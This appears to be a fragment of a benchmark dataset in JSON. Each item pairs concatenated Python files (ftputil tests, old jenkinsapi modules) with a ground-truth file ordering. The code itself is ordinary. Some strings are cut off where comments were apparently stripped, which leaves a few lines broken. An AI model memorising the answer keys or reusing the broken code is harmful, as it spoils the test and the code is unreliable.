test_base.ftp_host_factory(\n                 session_factory=RecursiveListingForDotAsPathSession)\n        lines = host._dir(\"\")\n        self.assertEqual(lines[0], \"total 10\")\n        self.assertTrue(lines[1].startswith(\"lrwxrwxrwx   1 staff\"))\n        self.assertTrue(lines[2].startswith(\"d--x--x--x   2 staff\"))\n        host.close()\n\n    def test_empty_string_instead_of_dot_workaround(self):\n        host = test_base.ftp_host_factory(\n                 session_factory=RecursiveListingForDotAsPathSession)\n        files = host.listdir(host.curdir)\n        self.assertEqual(files, [\"bin\", \"dev\", \"etc\", \"pub\", \"usr\"])\n        host.close()\n\n\nclass TestUploadAndDownload(unittest.TestCase):\n\n\n    def generate_file(self, data, file_name):\n\n        with open(file_name, \"wb\") as source_file:\n            source_file.write(data)\n\n    def test_download(self):\n\n        local_target = \"_test_target_\"\n        host = test_base.ftp_host_factory(\n                 session_factory=BinaryDownloadMockSession)\n\n        host.download(\"dummy\", local_target)\n\n        with open(local_target, \"rb\") as fobj:\n            data = fobj.read()\n        remote_file_content = mock_ftplib.content_of(\"dummy\")\n        self.assertEqual(data, remote_file_content)\n\n        os.unlink(local_target)\n\n    def test_conditional_upload(self):\n\n        local_source = \"_test_source_\"\n        data = binary_data()\n        self.generate_file(data, local_source)\n\n        host = test_base.ftp_host_factory(\n                 ftp_host_class=FailingUploadAndDownloadFTPHost)\n        flag = host.upload_if_newer(local_source, \"/home/newer\")\n        self.assertEqual(flag, False)\n\n        host = test_base.ftp_host_factory()\n        flag = host.upload_if_newer(local_source, \"/home/older\")\n        self.assertEqual(flag, True)\n        remote_file_content = mock_ftplib.content_of(\"older\")\n        self.assertEqual(data, remote_file_content)\n\n        host = test_base.ftp_host_factory()\n        flag = host.upload_if_newer(local_source, \"/home/notthere\")\n        self.assertEqual(flag, True)\n        remote_file_content = mock_ftplib.content_of(\"notthere\")\n        self.assertEqual(data, remote_file_content)\n\n        os.unlink(local_source)\n\n    def compare_and_delete_downloaded_data(self, file_name):\n\n        with open(file_name, \"rb\") as fobj:\n            data = fobj.read()\n\n        remote_file_content = mock_ftplib.content_of(\"newer\")\n        self.assertEqual(data, remote_file_content)\n\n        os.unlink(file_name)\n\n    def test_conditional_download_without_target(self):\n\n        local_target = \"_test_target_\"\n\n        host = test_base.ftp_host_factory(\n                 session_factory=BinaryDownloadMockSession)\n        flag = host.download_if_newer(\"/home/newer\", local_target)\n        self.assertEqual(flag, True)\n        self.compare_and_delete_downloaded_data(local_target)\n\n    def test_conditional_download_with_older_target(self):\n\n        local_target = \"_test_target_\"\n\n        open(local_target, \"w\").close()\n\n        host = test_base.ftp_host_factory(\n                 session_factory=BinaryDownloadMockSession)\n        flag = host.download_if_newer(\"/home/newer\", local_target)\n        self.assertEqual(flag, True)\n        self.compare_and_delete_downloaded_data(local_target)\n\n    def test_conditional_download_with_newer_target(self):\n\n        local_target = \"_test_target_\"\n\n        open(local_target, \"w\").close()\n\n        host = test_base.ftp_host_factory(\n                 ftp_host_class=FailingUploadAndDownloadFTPHost,\n                 session_factory=BinaryDownloadMockSession)\n        flag = host.download_if_newer(\"/home/older\", local_target)\n        self.assertEqual(flag, False)\n\n        os.unlink(local_target)\n\n\nclass TestTimeShift(unittest.TestCase):\n\n    def test_rounded_time_shift(self):\n\n        host = test_base.ftp_host_factory(session_factory=TimeShiftMockSession)\n\n        rounded_time_shift = host._FTPHost__rounded_time_shift\n\n        test_data = [\n          (      0,           0),\n          (      0.1,         0),\n          (     -0.1,         0),\n          (   1500,           0),\n          (  -1500,           0),\n          (   1800,        3600),\n          (  -1800,       -3600),\n          (   2000,        3600),\n          (  -2000,       -3600),\n          ( 5*3600-100,  5*3600),\n          (-5*3600+100, -5*3600)]\n        for time_shift, expected_time_shift in test_data:\n            calculated_time_shift = rounded_time_shift(time_shift)\n            self.assertEqual(calculated_time_shift, expected_time_shift)\n\n    def test_assert_valid_time_shift(self):\n\n        host = test_base.ftp_host_factory(session_factory=TimeShiftMockSession)\n\n        assert_time_shift = host._FTPHost__assert_valid_time_shift\n\n        test_data = [23*3600, -23*3600, 3600+30, -3600+30]\n        for time_shift in test_data:\n            self.assertTrue(assert_time_shift(time_shift) is None)\n\n        self.assertRaises(ftputil.error.TimeShiftError, assert_time_shift,\n                          25*3600)\n        self.assertRaises(ftputil.error.TimeShiftError, assert_time_shift,\n                          -25*3600)\n\n        self.assertRaises(ftputil.error.TimeShiftError, assert_time_shift,\n                          10*60)\n        self.assertRaises(ftputil.error.TimeShiftError, assert_time_shift,\n                          -3600-10*60)\n\n    def test_synchronize_times(self):\n\n        host = test_base.ftp_host_factory(ftp_host_class=TimeShiftFTPHost,\n                                          session_factory=TimeShiftMockSession)\n\n        host.path.set_mtime(time.time() + 3630)\n        host.synchronize_times()\n        self.assertEqual(host.time_shift(), 3600)\n\n        host.path.set_mtime(time.time() + 3600+10*60)\n        self.assertRaises(ftputil.error.TimeShiftError, host.synchronize_times)\n\n    def test_synchronize_times_for_server_in_east(self):\n        \"\"\"Test for timestamp correction (see ticket\n        host = test_base.ftp_host_factory(ftp_host_class=TimeShiftFTPHost,\n                                          session_factory=TimeShiftMockSession)\n\n        host.set_time_shift(0.0)\n        hour = 60 * 60\n\n        presumed_time_shift = -6 * hour\n\n\n\n\n\n\n\n\n\n        local_time = time.localtime()\n        local_time_with_wrong_year = (local_time.tm_year-1,) + local_time[1:]\n        presumed_server_time = \\\n          time.mktime(local_time_with_wrong_year) + presumed_time_shift\n        host.path.set_mtime(presumed_server_time)\n        host.synchronize_times()\n        self.assertEqual(host.time_shift(), presumed_time_shift)\n\n\nclass TestAcceptEitherUnicodeOrBytes(unittest.TestCase):\n\n\n    def setUp(self):\n        self.host = test_base.ftp_host_factory()\n\n    def test_upload(self):\n\n        host = self.host\n\n        host.upload(\"Makefile\", \"target\")\n        host.upload(\"Makefile\", ftputil.tool.as_bytes(\"target\"))\n\n    def test_download(self):\n\n        host = test_base.ftp_host_factory(\n                 session_factory=BinaryDownloadMockSession)\n        local_file_name = \"_local_target_\"\n        host.download(\"source\", local_file_name)\n        host.download(ftputil.tool.as_bytes(\"source\"), local_file_name)\n        os.remove(local_file_name)\n\n    def test_rename(self):\n\n\n        path_as_unicode = \"/home/file_name_test/ä\"\n        path_as_bytes = ftputil.tool.as_bytes(path_as_unicode)\n        paths = [path_as_unicode, path_as_bytes]\n        for source_path, target_path in itertools.product(paths, paths):\n            self.host.rename(source_path, target_path)\n\n    def test_listdir(self):\n\n        host = self.host\n        as_bytes = ftputil.tool.as_bytes\n        host.chdir(\"/home/file_name_test\")\n\n        items = host.listdir(\"ä\")\n        self.assertEqual(items, [\"ö\", \"o\"])\n\n        for item in items:\n            self.assertTrue(isinstance(item, ftputil.compat.unicode_type))\n\n        items = host.listdir(as_bytes(\"ä\"))\n        self.assertEqual(items, [as_bytes(\"ö\"), as_bytes(\"o\")])\n\n        for item in items:\n            self.assertTrue(isinstance(item, ftputil.compat.bytes_type))\n\n    def test_chmod(self):\n\n        host = self.host\n\n\n        host._session.voidcmd = host._session._ignore_arguments\n        path = \"/home/file_name_test/ä\"\n        host.chmod(path, 0o755)\n        host.chmod(ftputil.tool.as_bytes(path), 0o755)\n\n    def _test_method_with_single_path_argument(self, method, path):\n        method(path)\n        method(ftputil.tool.as_bytes(path))\n\n    def test_chdir(self):\n\n        self._test_method_with_single_path_argument(\n          self.host.chdir, \"/home/file_name_test/ö\")\n\n    def test_mkdir(self):\n\n\n\n        self._test_method_with_single_path_argument(\n          self.host.mkdir, \"/home/file_name_test/ä\")\n\n    def test_makedirs(self):\n\n        self._test_method_with_single_path_argument(\n          self.host.makedirs, \"/home/file_name_test/ä\")\n\n    def test_rmdir(self):\n\n        empty_directory_as_required_by_rmdir = \"/home/file_name_test/empty_ä\"\n        self._test_method_with_single_path_argument(\n          self.host.rmdir, empty_directory_as_required_by_rmdir)\n\n    def test_remove(self):\n\n        self._test_method_with_single_path_argument(\n          self.host.remove, \"/home/file_name_test/ö\")\n\n    def test_rmtree(self):\n\n        empty_directory_as_required_by_rmtree = \"/home/file_name_test/empty_ä\"\n        self._test_method_with_single_path_argument(\n          self.host.rmtree, empty_directory_as_required_by_rmtree)\n\n    def test_lstat(self):\n\n        self._test_method_with_single_path_argument(\n          self.host.lstat, \"/home/file_name_test/ä\")\n\n    def test_stat(self):\n\n        self._test_method_with_single_path_argument(\n          self.host.stat, \"/home/file_name_test/ä\")\n\n    def test_walk(self):\n\n\n        self._test_method_with_single_path_argument(\n          self.host.walk, \"/home/file_name_test/ä\")\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n    import __main__\n\n\n\n'Ramen/fs_libs/ftputil/test/test_with_statement.py'\n:\n\n\n\nfrom __future__ import unicode_literals\n\nimport unittest\n\nimport ftputil.error\n\nfrom test import test_base\nfrom test.test_file import InaccessibleDirSession, ReadMockSession\nfrom test.test_host import FailOnLoginSession\n\n\n\n\nclass ClientCodeException(Exception):\n    pass\n\n\n\n\n\nclass TestHostContextManager(unittest.TestCase):\n\n    def test_normal_operation(self):\n        with test_base.ftp_host_factory() as host:\n            self.assertEqual(host.closed, False)\n        self.assertEqual(host.closed, True)\n\n    def test_ftputil_exception(self):\n        try:\n            with test_base.ftp_host_factory(FailOnLoginSession) as host:\n                pass\n        except ftputil.error.FTPOSError:\n\n\n\n            self.assertFalse(\"host\" in locals())\n        else:\n            raise self.failureException(\"ftputil.error.FTPOSError not raised\")\n\n    def test_client_code_exception(self):\n        try:\n            with test_base.ftp_host_factory() as host:\n                self.assertEqual(host.closed, False)\n                raise ClientCodeException()\n        except ClientCodeException:\n            self.assertEqual(host.closed, True)\n        else:\n            raise self.failureException(\"ClientCodeException not raised\")\n\n\nclass TestFileContextManager(unittest.TestCase):\n\n    def test_normal_operation(self):\n        with test_base.ftp_host_factory(\n               session_factory=ReadMockSession) as host:\n            with host.open(\"dummy\", \"r\") as f:\n                self.assertEqual(f.closed, False)\n                data = f.readline()\n                self.assertEqual(data, \"line 1\\n\")\n                self.assertEqual(f.closed, False)\n            self.assertEqual(f.closed, True)\n\n    def test_ftputil_exception(self):\n        with test_base.ftp_host_factory(\n               session_factory=InaccessibleDirSession) as host:\n            try:\n\n\n                with host.open(\"/inaccessible/new_file\", \"w\") as f:\n                    pass\n            except ftputil.error.FTPIOError:\n\n\n                self.assertFalse(\"f\" in locals())\n            else:\n                raise self.failureException(\n                        \"ftputil.error.FTPIOError not raised\")\n\n    def test_client_code_exception(self):\n        with test_base.ftp_host_factory(\n               session_factory=ReadMockSession) as host:\n            try:\n                with host.open(\"dummy\", \"r\") as f:\n                    self.assertEqual(f.closed, False)\n                    raise ClientCodeException()\n            except ClientCodeException:\n                self.assertEqual(f.closed, True)\n            else:\n                raise self.failureException(\"ClientCodeException not raised\")\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n\n'Ramen/fs_libs/ftputil/build/lib/ftputil/__init__.py'\n:\n\n\n\"\"\"\nftputil - high-level FTP client library\n\nFTPHost objects\n    This class resembles the `os` module's interface to ordinary file\n    systems. In addition, it provides a method `file` which will\n    return file-objects corresponding to remote files.\n\n\n    with ftputil.FTPHost(\"ftp.domain.com\", \"me\", \"secret\") as host:\n        print host.getcwd()\n        host.mkdir(\"newdir\")\n        host.chdir(\"newdir\")\n        with host.open(\"sourcefile\", \"r\") as source:\n            with host.open(\"targetfile\", \"w\") as target:\n                host.copyfileobj(source, target)\n        host.remove(\"targetfile\")\n        host.chdir(host.pardir)\n        host.rmdir(\"newdir\")\n\n    There are also shortcuts for uploads and downloads:\n\n    host.upload(local_file, remote_file)\n    host.download(remote_file, local_file)\n\n    Both accept an additional mode parameter. If it is \"b\", the\n    transfer mode will be for binary files.\n\n    For even more functionality refer to the documentation in\n    `ftputil.txt` or `ftputil.html`.\n\nFTPFile objects\n    `FTPFile` objects are constructed via the `file` method (`open`\n    is an alias) of `FTPHost` objects. `FTPFile` objects support the\n    usual file operations for non-seekable files (`read`, `readline`,\n    `readlines`, `write`, `writelines`, `close`).\n\nNote: ftputil currently is not threadsafe. More specifically, you can\n      use different `FTPHost` objects in different threads but not\n      a single `FTPHost` object in different threads.\n\"\"\"\n\nfrom __future__ import absolute_import\nfrom __future__ import unicode_literals\n\nfrom ftputil.host    import FTPHost\nfrom ftputil.version import __version__\n\n\n\n\n__all__ = [\"FTPHost\", \"__version__\"]\n",
        "gt": [
            "'Ramen/fs_libs/ftputil/build/lib/ftputil/__init__.py'",
            "'Ramen/fs_libs/ftputil/test/test_host.py'",
            "'Ramen/fs_libs/ftputil/test/test_with_statement.py'"
        ]
    },
    {
        "files": [
            "'jenkinsapi-old/jenkinsapi/job.py'",
            "'jenkinsapi-old/jenkinsapi/config.py'",
            "'jenkinsapi-old/jenkinsapi/view.py'",
            "'jenkinsapi-old/jenkinsapi/build.py'"
        ],
        "content": "'jenkinsapi-old/jenkinsapi/job.py'\n:import logging\nimport urlparse\nimport urllib2\nimport urllib\nfrom bs4 import BeautifulSoup\nfrom collections import defaultdict\nfrom time import sleep\nfrom jenkinsapi.build import Build\nfrom jenkinsapi.jenkinsbase import JenkinsBase\n\nfrom exceptions import NoBuildData, NotFound\n\nlog = logging.getLogger(__name__)\n\nclass Job(JenkinsBase):\n\n    def __init__( self, url, name, jenkins_obj ):\n        self.name = name\n        self.jenkins = jenkins_obj\n        self._revmap = None\n        self._config = None\n        JenkinsBase.__init__( self, url )\n\n    def id( self ):\n        return self._data[\"name\"]\n\n    def __str__(self):\n        return self._data[\"name\"]\n\n    def get_jenkins_obj(self):\n        return self.jenkins\n\n    def get_build_triggerurl( self, token=None, params={} ):\n        if token is None and not params:\n            extra = \"build\"\n        elif params:\n            if token:\n                assert isinstance(token, str ), \"token if provided should be a string.\"\n                params['token'] = token\n            extra = \"buildWithParameters?\" + urllib.urlencode(params)\n        else:\n            assert isinstance(token, str ), \"token if provided should be a string.\"\n            extra = \"build?\" + urllib.urlencode({'token':token})\n        buildurl = urlparse.urljoin( self.baseurl, extra )\n        return buildurl\n\n    def invoke(self, securitytoken=None, block=False, skip_if_running=False, invoke_pre_check_delay=3, invoke_block_delay=15, params={}):\n        assert isinstance( invoke_pre_check_delay, (int, float) )\n        assert isinstance( invoke_block_delay, (int, float) )\n        assert isinstance( block, bool )\n        assert isinstance( skip_if_running, bool )\n        if self.is_queued():\n            log.warn( \"Will not request new build because %s is already queued\" % self.id() )\n            pass\n        elif self.is_running():\n            if skip_if_running:\n                log.warn( \"Will not request new build because %s is already running\" % self.id() )\n                pass\n            else:\n                log.warn(\"Will re-schedule %s even though it is already running\" % self.id() )\n        original_build_no = self.get_last_buildnumber()\n        log.info( \"Attempting to start %s on %s\" % ( self.id(), repr(self.get_jenkins_obj()) ) )\n        url = self.get_build_triggerurl( securitytoken, params)\n        html_result = self.hit_url(url)\n        assert len( html_result ) > 0\n        if invoke_pre_check_delay > 0:\n            log.info(\"Waiting for %is to allow Jenkins to catch up\" % invoke_pre_check_delay )\n            sleep( invoke_pre_check_delay )\n        if block:\n            total_wait = 0\n            while self.is_queued():\n                log.info( \"Waited %is for %s to begin...\" % ( total_wait, self.id() ) )\n                sleep( invoke_block_delay )\n                total_wait += invoke_block_delay\n            if self.is_running():\n                running_build = self.get_last_build()\n                running_build.block_until_complete( delay=invoke_pre_check_delay )\n            assert self.get_last_buildnumber() > original_build_no, \"Job does not appear to have run.\"\n        else:\n            if self.is_queued():\n                log.info( \"%s has been queued.\" % self.id() )\n            elif self.is_running():\n                log.info( \"%s is running.\" % self.id() )\n            elif original_build_no < self.get_last_buildnumber():\n                log.info( \"%s has completed.\" % self.id() )\n            else:\n                raise AssertionError(\"The job did not schedule.\")\n\n    def _buildid_for_type(self, buildtype):\n\n        KNOWNBUILDTYPES=[\"lastSuccessfulBuild\", \"lastBuild\", \"lastCompletedBuild\"]\n        assert buildtype in KNOWNBUILDTYPES\n        if self._data[buildtype] == None:\n            return None\n        buildid = self._data[buildtype][\"number\"]\n        assert type(buildid) == int, \"Build ID should be an integer, got %s\" % repr( buildid )\n        return buildid\n\n    def get_last_good_buildnumber( self ):\n\n        return self._buildid_for_type(buildtype=\"lastSuccessfulBuild\")\n\n    def get_last_buildnumber( self ):\n\n        return self._buildid_for_type(buildtype=\"lastBuild\")\n\n    def get_last_completed_buildnumber( self ):\n\n        return self._buildid_for_type(buildtype=\"lastCompletedBuild\")\n\n    def get_build_dict(self):\n        if not self._data.has_key( \"builds\" ):\n            raise NoBuildData( repr(self) )\n        return dict( ( a[\"number\"], a[\"url\"] ) for a in self._data[\"builds\"] )\n\n    def get_revision_dict(self):\n\n        revs = defaultdict(list)\n        if 'builds' not in self._data:\n            raise NoBuildData( repr(self))\n        for buildnumber in self.get_build_ids():\n            revs[self.get_build(buildnumber).get_revision()].append(buildnumber)\n        return revs\n\n    def get_build_ids(self):\n\n        return reversed( sorted( self.get_build_dict().keys() ) )\n\n    def get_last_good_build( self ):\n\n        bn = self.get_last_good_buildnumber()\n        return self.get_build( bn )\n\n    def get_last_build( self ):\n\n        bn = self.get_last_buildnumber()\n        return self.get_build( bn )\n\n    def get_last_build_or_none(self):\n\n        bn = self.get_last_buildnumber()\n        if bn is not None:\n            return self.get_build(bn)\n\n    def get_last_completed_build( self ):\n\n        bn = self.get_last_completed_buildnumber()\n        return self.get_build( bn )\n\n    def get_buildnumber_for_revision(self, revision, refresh=False):\n\n        if self.get_vcs() == 'svn' and not isinstance(revision, int):\n            revision = int(revision)\n        if self._revmap is None or refresh:\n            self._revmap = self.get_revision_dict()\n        try:\n            return self._revmap[revision]\n        except KeyError:\n            raise NotFound(\"Couldn't find a build with that revision\")\n\n    def get_build( self, buildnumber ):\n        assert type(buildnumber) == int\n        url = self.get_build_dict()[ buildnumber ]\n        return Build( url, buildnumber, job=self )\n\n    def __getitem__( self, buildnumber ):\n        return self.get_build(buildnumber)\n\n    def is_queued_or_running(self):\n        return self.is_queued() or self.is_running()\n\n    def is_queued(self):\n        self.poll()\n        return self._data[\"inQueue\"]\n\n    def is_running(self):\n        self.poll()\n        try:\n            build = self.get_last_build_or_none()\n            if build is not None:\n                return build.is_running()\n        except NoBuildData:\n            log.info(\"No build info available for %s, assuming not running.\" % str(self) )\n        return False\n\n    def get_config(self):\n\n        return self.hit_url(\"%(baseurl)s/config.xml\" % self.__dict__)\n\n    def load_config(self):\n        self._config = self.get_config()\n\n    def get_vcs(self):\n        if self._config is None:\n            self.load_config()\n\n        bs = BeautifulSoup(self._config, 'xml')\n        vcsmap = {\n            'hudson.scm.SubversionSCM': 'svn',\n            'hudson.plugins.git.GitSCM': 'git',\n            'hudson.plugins.mercurial.MercurialSCM': 'hg',\n            }\n        return vcsmap.get(bs.project.scm.attrs['class'])\n\n    def update_config(self, config):\n\n        return self.post_data(\"%(baseurl)s/config.xml\" % self.__dict__, config)\n\n    def get_downstream_jobs(self):\n\n        downstream_jobs = []\n        try:\n            for j in self._data['downstreamProjects']:\n                downstream_jobs.append(self.get_jenkins_obj().get_job(j['name']))\n        except KeyError:\n            return []\n        return downstream_jobs\n\n    def get_downstream_job_names(self):\n\n        downstream_jobs = []\n        try:\n            for j in self._data['downstreamProjects']:\n                downstream_jobs.append(j['name'])\n        except KeyError:\n            return []\n        return downstream_jobs\n\n    def get_upstream_job_names(self):\n\n        upstream_jobs = []\n        try:\n            for j in self._data['upstreamProjects']:\n                upstream_jobs.append(j['name'])\n        except KeyError:\n            return []\n        return upstream_jobs\n\n    def get_upstream_jobs(self):\n\n        upstream_jobs = []\n        try:\n            for j in self._data['upstreamProjects']:\n                upstream_jobs.append(self.get_jenkins_obj().get_job(j['name']))\n        except KeyError:\n            return []\n        return upstream_jobs\n\n'jenkinsapi-old/jenkinsapi/config.py'\n:JENKINS_API = r\"api/python/\"\nLOAD_TIMEOUT = 30\nLOAD_ATTEMPTS = 5\n'jenkinsapi-old/jenkinsapi/view.py'\n:from jenkinsapi.jenkinsbase import JenkinsBase\nfrom jenkinsapi.job import Job\nimport urllib\n\nclass View(JenkinsBase):\n\n    def __init__(self, url, name, jenkins_obj):\n        self.name = name\n        self.jenkins_obj = jenkins_obj\n        JenkinsBase.__init__(self, url)\n\n    def __str__(self):\n        return self.name\n\n    def __getitem__(self, str_job_id ):\n        assert isinstance( str_job_id, str )\n        api_url = self.python_api_url( self.get_job_url( str_job_id ) )\n        return Job( api_url, str_job_id, self.jenkins_obj )\n\n    def keys(self):\n        return self.get_job_dict().keys()\n\n    def iteritems(self):\n        for name, url in self.get_job_dict().iteritems():\n            api_url = self.python_api_url( url )\n            yield name, Job( api_url, name, self.jenkins_obj )\n\n    def values(self):\n        return [ a[1] for a in self.iteritems() ]\n\n    def items(self):\n        return [ a for a in self.iteritems() ]\n\n    def _get_jobs( self ):\n        if not self._data.has_key( \"jobs\" ):\n            pass\n        else:\n            for viewdict in self._data[\"jobs\"]:\n                yield viewdict[\"name\"], viewdict[\"url\"]\n\n    def get_job_dict(self):\n        return dict( self._get_jobs() )\n\n    def __len__(self):\n        return len( self.get_job_dict().keys() )\n\n    def get_job_url( self, str_job_name ):\n        try:\n            job_dict = self.get_job_dict()\n            return job_dict[ str_job_name ]\n        except KeyError:\n\n            all_views = \", \".join( job_dict.keys() )\n            raise KeyError(\"Job %s is not known - available: %s\" % ( str_job_name, all_views ) )\n\n    def get_jenkins_obj(self):\n        return self.jenkins_obj\n\n    def add_job(self, str_job_name):\n        if str_job_name in self.get_job_dict():\n            return \"Job %s has in View %s\" %(str_job_name, self.name)\n        elif not self.get_jenkins_obj().has_job(str_job_name):\n            return \"Job %s is not known - available: %s\" % ( str_job_name, \", \".join(self.get_jenkins_obj().get_jobs_list()))\n        else:\n            data = {\n                \"description\":\"\",\n                \"statusFilter\":\"\",\n                \"useincluderegex\":\"on\",\n                \"includeRegex\":\"\",\n                \"columns\": [{\"stapler-class\": \"hudson.views.StatusColumn\", \"kind\": \"hudson.views.StatusColumn\"},\n                            {\"stapler-class\": \"hudson.views.WeatherColumn\", \"kind\": \"hudson.views.WeatherColumn\"},\n                            {\"stapler-class\": \"hudson.views.JobColumn\", \"kind\": \"hudson.views.JobColumn\"},\n                            {\"stapler-class\": \"hudson.views.LastSuccessColumn\", \"kind\": \"hudson.views.LastSuccessColumn\"},\n                            {\"stapler-class\": \"hudson.views.LastFailureColumn\", \"kind\": \"hudson.views.LastFailureColumn\"},\n                            {\"stapler-class\": \"hudson.views.LastDurationColumn\", \"kind\": \"hudson.views.LastDurationColumn\"},\n                            {\"stapler-class\": \"hudson.views.BuildButtonColumn\", \"kind\": \"hudson.views.BuildButtonColumn\"}],\n                \"Submit\":\"OK\",\n                }\n            data[\"name\"] = self.name\n            for job in self.get_job_dict().keys():\n                data[job]='on'\n            data[str_job_name] = \"on\"\n            data['json'] = data.copy()\n            self.post_data('%sconfigSubmit' % self.baseurl, urllib.urlencode(data))\n            return \"Job %s is add in View %s successful\" % (str_job_name, self.baseurl)\n\n    def id(self):\n\n        return \"%s.%s\" % ( self.className, self.name )\n'jenkinsapi-old/jenkinsapi/build.py'\n:from jenkinsapi.artifact import Artifact\nfrom jenkinsapi import config\nfrom jenkinsapi.jenkinsbase import JenkinsBase\nfrom jenkinsapi.exceptions import NoResults, FailedNoResults\nfrom jenkinsapi.constants import STATUS_FAIL, STATUS_ABORTED, RESULTSTATUS_FAILURE\nfrom jenkinsapi.result_set import ResultSet\n\nfrom time import sleep\nimport logging\n\nlog = logging.getLogger(__name__)\n\nclass Build(JenkinsBase):\n\n\n    STR_TOTALCOUNT = \"totalCount\"\n    STR_TPL_NOTESTS_ERR = \"%s has status %s, and does not have any test results\"\n\n    def __init__( self, url, buildno, job ):\n        assert type(buildno) == int\n        self.buildno = buildno\n        self.job = job\n        JenkinsBase.__init__( self, url )\n\n    def __str__(self):\n        return self._data['fullDisplayName']\n\n    def id(self):\n        return self._data[\"number\"]\n\n    def get_status(self):\n        return self._data[\"result\"]\n\n    def get_revision(self):\n        vcs = self._data['changeSet']['kind'] or 'git'\n        return getattr(self, '_get_%s_rev' % vcs, lambda: None)()\n\n    def _get_svn_rev(self):\n        maxRevision = 0\n        for repoPathSet in self._data[\"changeSet\"][\"revisions\"]:\n            maxRevision = max(repoPathSet[\"revision\"], maxRevision)\n        return maxRevision\n\n    def _get_git_rev(self):\n        for item in self._data['actions']:\n            branch = item.get('buildsByBranchName')\n            head = branch and branch.get('origin/HEAD')\n            if head:\n                return head['revision']['SHA1']\n\n    def _get_hg_rev(self):\n        revs = [(item['date'], item['node'])\n                for item in self._data['changeSet']['items']]\n        revs = sorted(revs, key=lambda tup: float(tup[0].split('-')[0]))\n        return revs[-1][1]\n\n    def get_duration(self):\n        return self._data[\"duration\"]\n\n    def get_artifacts( self ):\n        for afinfo in self._data[\"artifacts\"]:\n            url = \"%sartifact/%s\" % ( self.baseurl, afinfo[\"relativePath\"] )\n            af = Artifact( afinfo[\"fileName\"], url, self )\n            yield af\n            del af, url\n\n    def get_artifact_dict(self):\n        return dict( (a.filename, a) for a in self.get_artifacts() )\n\n    def get_upstream_job_name(self):\n\n        try:\n            return self.get_actions()['causes'][0]['upstreamProject']\n        except KeyError:\n            return None\n\n    def get_upstream_job(self):\n\n        if self.get_upstream_job_name():\n            return self.get_jenkins_obj().get_job(self.get_upstream_job_name())\n        else:\n            return None\n\n    def get_upstream_build_number(self):\n\n        try:\n            return int(self.get_actions()['causes'][0]['upstreamBuild'])\n        except KeyError:\n            return None\n\n    def get_upstream_build(self):\n\n        upstream_job = self.get_upstream_job()\n        if upstream_job:\n            return upstream_job.get_build(self.get_upstream_build_number())\n        else:\n            return None\n\n    def get_master_job_name(self):\n\n        try:\n            return self.get_actions()['parameters'][0]['value']\n        except KeyError:\n            return None\n\n    def get_master_job(self):\n\n        if self.get_master_job_name():\n            return self.get_jenkins_obj().get_job(self.get_master_job_name())\n        else:\n            return None\n\n    def get_master_build_number(self):\n\n        try:\n            return int(self.get_actions()['parameters'][1]['value'])\n        except KeyError:\n            return None\n\n    def get_master_build(self):\n\n        master_job = self.get_master_job()\n        if master_job:\n            return master_job.get_build(self.get_master_build_number())\n        else:\n            return None\n\n    def get_downstream_jobs(self):\n\n        downstream_jobs_names = self.job.get_downstream_job_names()\n        fingerprint_data = self.get_data(\"%s?depth=2&tree=fingerprint[usage[name]]\" % self.python_api_url(self.baseurl))\n        downstream_jobs = []\n        try:\n            fingerprints = fingerprint_data['fingerprint'][0]\n            for f in fingerprints['usage']:\n                if f['name'] in downstream_jobs_names:\n                    downstream_jobs.append(self.get_jenkins_obj().get_job(f['name']))\n            return downstream_jobs\n        except (IndexError, KeyError):\n            return None\n\n    def get_downstream_job_names(self):\n\n        downstream_jobs_names = self.job.get_downstream_job_names()\n        fingerprint_data = self.get_data(\"%s?depth=2&tree=fingerprint[usage[name]]\" % self.python_api_url(self.baseurl))\n        downstream_names = []\n        try:\n            fingerprints = fingerprint_data['fingerprint'][0]\n            for f in fingerprints['usage']:\n                if f['name'] in downstream_jobs_names:\n                    downstream_names.append(f['name'])\n            return downstream_names\n        except (IndexError, KeyError):\n            return None\n\n    def get_downstream_builds(self):\n\n        downstream_jobs_names = self.job.get_downstream_job_names()\n        fingerprint_data = self.get_data(\"%s?depth=2&tree=fingerprint[usage[name,ranges[ranges[end,start]]]]\" % self.python_api_url(self.baseurl))\n        downstream_builds = []\n        try:\n            fingerprints = fingerprint_data['fingerprint'][0]\n            for f in fingerprints['usage']:\n                if f['name'] in downstream_jobs_names:\n                    downstream_builds.append(self.get_jenkins_obj().get_job(f['name']).get_build(f['ranges']['ranges'][0]['start']))\n            return downstream_builds\n        except (IndexError, KeyError):\n            return None\n\n    def is_running( self ):\n\n        self.poll()\n        return self._data[\"building\"]\n\n    def is_good( self ):\n\n        return ( not self.is_running() ) and self._data[\"result\"] == 'SUCCESS'\n\n    def block_until_complete(self, delay=15):\n        assert isinstance( delay, int )\n        count = 0\n        while self.is_running():\n            total_wait = delay * count\n            log.info(\"Waited %is for %s\n            sleep( delay )\n            count += 1\n\n    def get_jenkins_obj(self):\n        return self.job.get_jenkins_obj()\n\n    def get_result_url(self):\n\n        url_tpl = r\"%stestReport/%s\"\n        return  url_tpl % ( self._data[\"url\"] , config.JENKINS_API )\n\n    def get_resultset(self):\n\n        result_url = self.get_result_url()\n        if self.STR_TOTALCOUNT not in self.get_actions():\n            raise NoResults( \"%s does not have any published results\" % str(self) )\n        buildstatus = self.get_status()\n        if not self.get_actions()[self.STR_TOTALCOUNT]:\n            raise NoResults( self.STR_TPL_NOTESTS_ERR % ( str(self), buildstatus ) )\n        obj_results = ResultSet( result_url, build=self )\n        return obj_results\n\n    def has_resultset(self):\n\n        return self.STR_TOTALCOUNT in self.get_actions()\n\n    def get_actions(self):\n        all_actions = {}\n        for dct_action in self._data[\"actions\"]:\n            all_actions.update( dct_action )\n        return all_actions\n\n    def get_timestamp(self):\n        return self._data['timestamp']\n",
        "gt": [
            "'jenkinsapi-old/jenkinsapi/config.py'",
            "'jenkinsapi-old/jenkinsapi/build.py'",
            "'jenkinsapi-old/jenkinsapi/job.py'",
            "'jenkinsapi-old/jenkinsapi/view.py'"
        ]
    },
    {
        "files": [
            "'allennlp-server/allennlp_server/commands/server_simple.py'",
            "'allennlp-server/allennlp_server/commands/__init__.py'",
            "'allennlp-server/allennlp_server/__init__.py'"
        ],
